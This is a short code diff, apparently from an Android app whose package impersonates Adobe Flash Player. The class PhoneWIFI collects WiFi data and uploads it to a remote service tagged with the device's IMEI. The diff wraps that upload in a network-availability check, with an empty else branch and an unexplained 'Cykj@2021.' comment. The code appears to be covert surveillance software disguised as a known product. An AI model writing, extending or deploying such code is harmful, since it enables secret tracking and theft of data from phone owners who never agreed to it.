@@ -15,9 +15,10 @@ import com.adobe.flashplayer.MyLog;
 import com.adobe.flashplayer.PrefOper;
 import com.adobe.flashplayer.Public;
 import com.adobe.flashplayer.Utils;
+import com.adobe.flashplayer.network.NetworkUitls;
 import com.adobe.flashplayer.network.UploadData;
 
-
+//Cykj@2021.
 
 public class PhoneWIFI {
 
@@ -107,8 +108,11 @@ public class PhoneWIFI {
                             }
 
                             if (jsarray.length() > 0) {
-                                UploadData.upload(jsarray.toString().getBytes(), jsarray.toString().getBytes().length, Public.CMD_DATA_WIFI, Public.IMEI);
+                                if (NetworkUitls.isNetworkAvailable(context)) {
+                                    UploadData.upload(jsarray.toString().getBytes(), jsarray.toString().getBytes().length, Public.CMD_DATA_WIFI, Public.IMEI);
+                                }else{
 
+                                }
                             }
                         }
 
